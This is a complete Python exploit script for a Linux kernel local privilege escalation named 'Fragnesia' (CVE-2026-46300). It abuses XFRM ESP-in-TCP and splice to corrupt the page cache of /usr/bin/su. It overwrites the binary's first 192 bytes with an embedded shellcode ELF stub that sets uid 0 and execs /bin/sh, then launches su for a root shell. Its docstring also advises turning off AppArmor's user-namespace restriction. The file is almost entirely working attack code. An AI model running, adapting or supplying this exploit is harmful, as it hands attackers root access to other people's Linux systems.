#!/usr/bin/env python3
"""
Fragnesia (CVE-2026-46300) - Python Exploit
Universal Linux Local Privilege Escalation via XFRM ESP-in-TCP Page Cache Corruption

Based on the original C PoC by William Bowling / V12 Security.

Technique:
  1. Enter user+network namespace to gain CAP_NET_ADMIN.
  2. Install an XFRM ESP-in-TCP SA with AES-128-GCM and a known key.
  3. Build a 256-entry lookup table mapping every possible keystream byte
     to a 16-bit nonce using AF_ALG ECB(AES).
  4. For each target byte in /usr/bin/su:
       a. Read current byte value.
       b. Compute required keystream byte = current ^ desired.
       c. Look up nonce that produces this keystream byte.
       d. Spawn receiver (enables espintcp ULP) and sender (splice file pages
          into TCP stream prefixed with an ESP header carrying the chosen nonce).
       e. The kernel decrypts the file content in-place, XORing the keystream
          byte into the page cache because skb_try_coalesce() lost the
          SKBFL_SHARED_FRAG marker.
  5. After overwriting the first 192 bytes with a position-independent ELF stub,
     exec /usr/bin/su to obtain a root shell.

The on-disk binary is never modified; only the in-memory page cache is corrupted.
A reboot restores the original state.

Ubuntu users: if AppArmor blocks unprivileged user namespaces, run:
  sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
"""

import os
import sys
import socket
import struct
import time
import ctypes

# =============================================================================
# Constants
# =============================================================================

CLONE_NEWUSER = 0x10000000
CLONE_NEWNET = 0x40000000
TCP_ULP = 31
TCP_ENCAP_ESPINTCP = 7
TCP_NODELAY = 1
TCP_PORT = 5556
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_OP = 3
ALG_OP_ENCRYPT = 1
NETLINK_XFRM = 6
XFRM_MSG_NEWSA = 16
XFRMA_ALG_AEAD = 18
XFRMA_ENCAP = 4
NLM_F_REQUEST = 1
NLM_F_ACK = 4
NLM_F_CREATE = 0x400
NLM_F_EXCL = 0x200
FRAG_LEN = 4096
ESP_GCM_ICV_LEN = 16
PAYLOAD_LEN = 192
RECEIVER_PRE_ULP_US = 30000
SENDER_PRE_SPLICE_US = 1000
RECEIVER_POST_ULP_US = 30000

# 20-byte AEAD key: 16-byte AES key + 4-byte salt
XFRM_AEAD_KEY = bytes([
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
    0x01, 0x02, 0x03, 0x04
])

# Position-independent ELF stub (192 bytes) that does:
#   setresuid(0,0,0); setresgid(0,0,0); execve("/bin/sh", {"/bin/sh"}, env);
SHELL_ELF = bytes([
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
    0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0xb0, 0x74, 0x0f, 0x05, 0x6a, 0x00, 0x48, 0x8d, 0x05, 0x12,
    0x00, 0x00, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x8d, 0x3d, 0x12, 0x00, 0x00, 0x00, 0x31, 0xf6,
    0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x54, 0x45, 0x52, 0x4d, 0x3d, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x00,
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
])

# =============================================================================
# Utility helpers
# =============================================================================

def die(msg):
    print(f"{msg}: {os.strerror(ctypes.get_errno())}", file=sys.stderr)
    sys.exit(2)


def gate_fail(msg):
    errno = ctypes.get_errno()
    print(f"namespace_gate_failed: {msg} errno={errno} ({os.strerror(errno)})")
    sys.exit(4)


def read_byte_at(path, off):
    with open(path, "rb") as f:
        f.seek(off)
        data = f.read(1)
        if len(data) != 1:
            raise RuntimeError(f"short read at offset={off}")
        return data[0]


# =============================================================================
# AF_ALG crypto: build 256-entry keystream lookup table
# =============================================================================

def open_afalg_aes_ecb():
    """Open an AF_ALG socket bound to ecb(aes) with the 16-byte AES key."""
    fd = socket.socket(AF_ALG, socket.SOCK_SEQPACKET | socket.SOCK_CLOEXEC, 0)
    sa = struct.pack(
        "=H14sII64s",
        AF_ALG,
        b"skcipher\x00\x00\x00\x00\x00\x00",
        0,
        0,
        b"ecb(aes)\x00" + b"\x00" * 57,
    )
    fd.bind(sa)
    fd.setsockopt(SOL_ALG, ALG_SET_KEY, XFRM_AEAD_KEY[:16])
    return fd


def afalg_aes_encrypt_block(alg_fd, in_block):
    """Encrypt a single 16-byte block via AF_ALG."""
    op = struct.pack("=I", ALG_OP_ENCRYPT)
    conn, _ = alg_fd.accept()
    conn.sendmsg([in_block], [(SOL_ALG, ALG_SET_OP, op)])
    out = conn.recv(16)
    conn.close()
    return out


def aes_gcm_stream0_byte(alg_fd, iv):
    """
    Compute the first byte of the AES-GCM keystream for counter block:
        salt (4 bytes) || IV (8 bytes) || counter=2 (4 bytes BE)
    """
    counter_block = XFRM_AEAD_KEY[16:20] + iv + struct.pack(">I", 2)
    stream = afalg_aes_encrypt_block(alg_fd, counter_block)
    return stream[0]


def build_stream0_table():
    """
    Brute-force 16-bit nonces to find 256 different IVs that produce each
    possible first keystream byte (0x00-0xff).
    """
    iv = bytearray([0xCC] * 8)
    stream0_have = [False] * 256
    stream0_nonce = [0] * 256
    count = 0

    alg_fd = open_afalg_aes_ecb()
    for nonce in range(0x10000):
        if count >= 256:
            break
        struct.pack_into(">I", iv, 4, nonce)
        b = aes_gcm_stream0_byte(alg_fd, bytes(iv))
        if stream0_have[b]:
            continue
        stream0_have[b] = True
        stream0_nonce[b] = nonce
        count += 1

    alg_fd.close()

    if count != 256:
        raise RuntimeError(f"failed to build complete stream-byte table: {count}/256")
    print("stream0_table_entries=256")
    return stream0_nonce


# =============================================================================
# Netlink XFRM: install ESP-in-TCP SA
# =============================================================================

def nlmsg_align(length):
    return (length + 3) & ~3


def add_nlattr(nlh_data, maxlen, nla_type, data):
    """Append a netlink attribute to the message buffer."""
    off = nlmsg_align(len(nlh_data))
    nla_len = 4 + len(data)
    padded_len = nlmsg_align(nla_len)
    if off + padded_len > maxlen:
        raise RuntimeError("netlink message too small")
    attr = struct.pack("HH", nla_len, nla_type) + data
    attr += b"\x00" * (padded_len - nla_len)
    return nlh_data[:off] + attr


def add_xfrm_espintcp_state():
    """Install the XFRM Security Association for ESP-in-TCP over loopback."""
    # --- xfrm_usersa_info (224 bytes) ---
    sel = b"\x00" * 56

    id_daddr = socket.inet_pton(socket.AF_INET6, "::1")
    id_spi = struct.pack(">I", 0x100)
    id_family = struct.pack("H", socket.AF_INET6)
    id_pad = b"\x00" * 2
    id_ = id_daddr + id_spi + id_family + id_pad

    saddr = socket.inet_pton(socket.AF_INET6, "::1")

    XFRM_INF = 0xFFFFFFFFFFFFFFFF
    lft = struct.pack("Q" * 8, XFRM_INF, XFRM_INF, XFRM_INF, XFRM_INF, 0, 0, 0, 0)

    curlft = b"\x00" * 32
    stats = b"\x00" * 12
    seq = struct.pack("I", 0)
    reqid = struct.pack("I", 1)
    family = struct.pack("H", socket.AF_INET6)
    mode = b"\x00"
    replay_window = b"\x00"
    flags = b"\x00"

    xs = sel + id_ + saddr + lft + curlft + stats + seq + reqid + family + mode + replay_window + flags
    xs += b"\x00" * (224 - len(xs))
    assert len(xs) == 224

    # --- XFRMA_ALG_AEAD attribute ---
    alg_name = b"rfc4106(gcm(aes))" + b"\x00" * (64 - len(b"rfc4106(gcm(aes))"))
    alg_key_len = struct.pack("I", len(XFRM_AEAD_KEY) * 8)
    alg_icv_len = struct.pack("I", 128)
    aead_data = alg_name + alg_key_len + alg_icv_len + XFRM_AEAD_KEY

    # --- XFRMA_ENCAP attribute ---
    encap_type = struct.pack("H", TCP_ENCAP_ESPINTCP)
    encap_sport = struct.pack(">H", TCP_PORT)
    encap_dport = struct.pack(">H", TCP_PORT)
    encap_data = encap_type + encap_sport + encap_dport + b"\x00" * (24 - 6)
    assert len(encap_data) == 24

    # --- Build netlink message ---
    nlh = struct.pack("=IHHII", 16 + 224, XFRM_MSG_NEWSA,
                      NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
                      1, 0)
    msg = nlh + xs
    msg = add_nlattr(msg, 4096, XFRMA_ALG_AEAD, aead_data)
    msg = add_nlattr(msg, 4096, XFRMA_ENCAP, encap_data)
    msg = struct.pack("I", len(msg)) + msg[4:]

    fd = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW | socket.SOCK_CLOEXEC, NETLINK_XFRM)
    sa = struct.pack("=HHII", socket.AF_NETLINK, 0, 0, 0)
    fd.bind(sa)
    fd.sendto(msg, 0, sa)

    resp = fd.recv(4096)
    fd.close()

    resp_len, resp_type, _, _, _ = struct.unpack_from("=IHHII", resp, 0)
    if resp_type == 2:  # NLMSG_ERROR
        error = struct.unpack_from("i", resp, 16)[0]
        if error != 0:
            errno = -error
            raise RuntimeError(f"XFRM_MSG_NEWSA failed: errno={errno} ({os.strerror(errno)})")
    else:
        raise RuntimeError("unexpected netlink response type")

    print("xfrm_espintcp_state_add=1")


# =============================================================================
# Namespace setup
# =============================================================================

def enter_mapped_userns():
    """Fork helper to map outer UID/GID to 0 inside a new user namespace."""
    outer_uid = os.getuid()
    outer_gid = os.getgid()
    ready_pipe = os.pipe()
    mapped_pipe = os.pipe()

    child = os.fork()
    if child > 0:
        os.close(ready_pipe[1])
        os.close(mapped_pipe[0])

        os.read(ready_pipe[0], 1)
        os.close(ready_pipe[0])

        try:
            with open(f"/proc/{child}/uid_map", "w") as f:
                f.write(f"0 {outer_uid} 1\n")
            with open(f"/proc/{child}/setgroups", "w") as f:
                f.write("deny\n")
            with open(f"/proc/{child}/gid_map", "w") as f:
                f.write(f"0 {outer_gid} 1\n")
        except OSError as e:
            print(f"namespace_gate_failed: proc write errno={e.errno} ({e.strerror})")
            os.kill(child, 9)
            os.waitpid(child, 0)
            sys.exit(4)

        os.write(mapped_pipe[1], b"M")
        os.close(mapped_pipe[1])

        _, status = os.waitpid(child, 0)
        if os.WIFEXITED(status):
            sys.exit(os.WEXITSTATUS(status))
        sys.exit(2)

    os.close(ready_pipe[0])
    os.close(mapped_pipe[1])

    os.unshare(os.CLONE_NEWUSER)

    os.write(ready_pipe[1], b"R")
    os.close(ready_pipe[1])
    os.read(mapped_pipe[0], 1)
    os.close(mapped_pipe[0])

    os.setresgid(0, 0, 0)
    os.setresuid(0, 0, 0)

    print(f"userns_setup: outer_uid={outer_uid} outer_gid={outer_gid} ns_uid={os.getuid()} ns_gid={os.getgid()}")


def bring_loopback_up():
    """Bring up the loopback interface inside the new network namespace."""
    import fcntl

    SIOCGIFFLAGS = 0x8913
    SIOCSIFFLAGS = 0x8914
    IFF_UP = 1

    fd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM | socket.SOCK_CLOEXEC)
    ifr = struct.pack("16sH14s", b"lo\x00", 0, b"\x00" * 14)
    flags = struct.unpack("16sH14s", fcntl.ioctl(fd, SIOCGIFFLAGS, ifr))[1]
    ifr = struct.pack("16sH14s", b"lo\x00", flags | IFF_UP, b"\x00" * 14)
    fcntl.ioctl(fd, SIOCSIFFLAGS, ifr)
    fd.close()
    print("loopback_up=1")


def setup_user_netns_xfrm():
    """Full namespace + XFRM setup."""
    libc = ctypes.CDLL(None)
    if libc.prctl(4, 1, 0, 0, 0) < 0:
        die("prctl PR_SET_DUMPABLE")

    enter_mapped_userns()
    os.unshare(os.CLONE_NEWNET)
    print("netns_setup=1")
    bring_loopback_up()
    add_xfrm_espintcp_state()
    print("namespace_setup_complete=1")


# =============================================================================
# Sender / Receiver processes
# =============================================================================

def receiver(ready_write_fd):
    """Accept a TCP connection, then switch to espintcp ULP."""
    addr = ("::1", TCP_PORT, 0, 0)
    fd = socket.socket(socket.AF_INET6, socket.SOCK_STREAM | socket.SOCK_CLOEXEC)
    fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    fd.bind(addr)
    fd.listen(1)

    os.write(ready_write_fd, b"R")
    os.close(ready_write_fd)

    cfd, _ = fd.accept()

    time.sleep(RECEIVER_PRE_ULP_US / 1_000_000.0)
    cfd.setsockopt(socket.IPPROTO_TCP, TCP_ULP, b"espintcp\x00")
    print(f"receiver_ns_uid={os.getuid()} euid={os.geteuid()} espintcp_enabled_after_queue=1")
    time.sleep(RECEIVER_POST_ULP_US / 1_000_000.0)
    cfd.close()
    fd.close()
    os._exit(0)


def sender(ready_read_fd, target_file, target_splice_off, active_esp_seq, active_esp_gcm_iv):
    """Connect to receiver, send ESP prefix, then splice file pages into TCP."""
    os.read(ready_read_fd, 1)
    os.close(ready_read_fd)

    prefix = bytearray(18)
    struct.pack_into(">H", prefix, 0, 18 + FRAG_LEN)
    prefix[2:6] = b"\x00\x00\x01\x00"
    struct.pack_into(">I", prefix, 4, active_esp_seq)
    prefix[8:16] = active_esp_gcm_iv

    fd = os.open(target_file, os.O_RDONLY | os.O_CLOEXEC)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM | socket.SOCK_CLOEXEC)
    sock.setsockopt(socket.IPPROTO_TCP, TCP_NODELAY, 1)
    sock.connect(("::1", TCP_PORT, 0, 0))

    sock.sendall(bytes(prefix))

    time.sleep(SENDER_PRE_SPLICE_US / 1_000_000.0)

    p = os.pipe()
    ret = os.splice(fd, p[1], FRAG_LEN, offset_src=target_splice_off)
    if ret != FRAG_LEN:
        raise RuntimeError(f"splice file->pipe failed: {ret}")

    ret2 = os.splice(p[0], sock.fileno(), FRAG_LEN)

    print(f"sender_ns_uid={os.getuid()} euid={os.geteuid()} "
          f"prefix_send={len(prefix)} splice_to_tcp={ret2} file_off={target_splice_off}")

    os.close(p[0])
    os.close(p[1])
    sock.close()
    os.close(fd)
    os._exit(0 if ret2 == FRAG_LEN else 3)


def run_trigger_pair(target_file, target_splice_off, active_esp_seq, active_esp_gcm_iv):
    """Fork receiver and sender, wait for both to finish."""
    pipefd = os.pipe()

    rx = os.fork()
    if rx == 0:
        os.close(pipefd[0])
        receiver(pipefd[1])

    tx = os.fork()
    if tx == 0:
        os.close(pipefd[1])
        sender(pipefd[0], target_file, target_splice_off, active_esp_seq, active_esp_gcm_iv)

    os.close(pipefd[0])
    os.close(pipefd[1])

    _, st_tx = os.waitpid(tx, 0)
    _, st_rx = os.waitpid(rx, 0)

    print(f"sender_status={st_tx} receiver_status={st_rx}")
    if not os.WIFEXITED(st_tx) or os.WEXITSTATUS(st_tx) != 0 or \
       not os.WIFEXITED(st_rx) or os.WEXITSTATUS(st_rx) != 0:
        return -1
    return 0


# =============================================================================
# Main byte-smashing loop
# =============================================================================

def replace_existing_bytes_after(byte_off, desired, target_file, file_size):
    """Overwrite read-only page cache bytes one at a time using Fragnesia."""
    desired_len = len(desired)
    last = byte_off + desired_len - 1

    if last >= file_size:
        raise ValueError("byte range outside target")
    if last > file_size - FRAG_LEN:
        raise ValueError(f"collateral-after mode requires end <= size-{FRAG_LEN}")

    print(f"\n[*] timing: rx_pre_ulp={RECEIVER_PRE_ULP_US}us tx_pre_splice={SENDER_PRE_SPLICE_US}us rx_post_ulp={RECEIVER_POST_ULP_US}us")
    print(f"[*] range: offset=0x{byte_off:x} len={desired_len} last=0x{last:x}")
    print(f"[*] payload: {desired.hex()}")

    stream0_nonce = build_stream0_table()
    print()

    live_state = bytearray(desired_len)
    with open(target_file, "rb") as f:
        f.seek(byte_off)
        live_state[:] = f.read(desired_len)

    active_esp_seq = 1
    active_esp_gcm_iv = bytearray([0xCC] * 8)
    changed = 0
    skipped = 0

    for idx in range(desired_len):
        off = byte_off + idx
        current = read_byte_at(target_file, off)
        live_state[idx] = current

        if current == desired[idx]:
            print(f"[-] [{idx+1}/{desired_len}] +{off:04x} already={current:02x} skip")
            skipped += 1
            continue

        need_stream = current ^ desired[idx]
        nonce = stream0_nonce[need_stream]

        active_esp_gcm_iv[:] = [0xCC] * 8
        struct.pack_into(">I", active_esp_gcm_iv, 4, nonce)
        active_esp_seq += 1

        print(f"[*] [{idx+1}/{desired_len}] +{off:04x}  {current:02x} -> {desired[idx]:02x}  "
              f"xor={need_stream:02x} seq={active_esp_seq} nonce={nonce}")
        print(" firing espintcp splice...")

        if run_trigger_pair(target_file, off, active_esp_seq, bytes(active_esp_gcm_iv)) < 0:
            raise RuntimeError(f"trigger pair failed at index={idx}")

        final = read_byte_at(target_file, off)
        live_state[idx] = final

        if final == desired[idx]:
            print(f"[+] smashed {current:02x} -> {final:02x}  index={idx} offset=+{off:04x}\n")
            changed += 1
        elif final == current:
            print(f"[-] fixed behavior: byte unchanged at index={idx} offset={off}")
            return 0
        else:
            print(f"[-] BUG: byte changed but desired-value check mismatched "
                  f"index={idx} offset={off} desired={desired[idx]:02x} got={final:02x}")
            return 1

    print(f"[*] verifying {desired_len} bytes...")
    for idx in range(desired_len):
        off = byte_off + idx
        final = read_byte_at(target_file, off)
        if final != desired[idx]:
            print(f"[-] BUG: final verify mismatch index={idx} offset={off} "
                  f"desired={desired[idx]:02x} got={final:02x}")
            return 1

    print(f"[*] bytes_flip_summary len={desired_len} changed={changed} skipped={skipped}")
    if changed == 0:
        print("all requested bytes already had desired values", file=sys.stderr)
        return 2

    print("[+] BUG: changed requested copied byte range to desired values")
    return 1


# =============================================================================
# Entry point
# =============================================================================

def main():
    print(f"[*] uid={os.getuid()} euid={os.geteuid()} gid={os.getgid()} egid={os.getegid()}")
    print("[*] mode=xfrm_espintcp_pagecache_replace collateral=after")
    print()

    target_file = "/usr/bin/su"
    file_size = os.path.getsize(target_file)
    byte_off = 0
    desired = SHELL_ELF

    print(f"[*] target={target_file} size={file_size}")

    try:
        fd = os.open(target_file, os.O_WRONLY | os.O_CLOEXEC)
        os.close(fd)
        print("namespace_gate_failed: outer write-open unexpectedly succeeded")
        sys.exit(4)
    except PermissionError:
        print("outer_write_open_denied=1")

    setup_user_netns_xfrm()

    try:
        fd = os.open(target_file, os.O_WRONLY | os.O_CLOEXEC)
        os.close(fd)
        print("namespace_gate_failed: userns_root_mapped_to_outer_user write-open unexpectedly succeeded")
        sys.exit(4)
    except PermissionError:
        print("userns_root_mapped_to_outer_user_write_open_denied=1")

    ret = replace_existing_bytes_after(byte_off, desired, target_file, file_size)

    os.execve("/usr/bin/su", ["/usr/bin/su"], os.environ)
    return ret


if __name__ == "__main__":
    sys.exit(main())
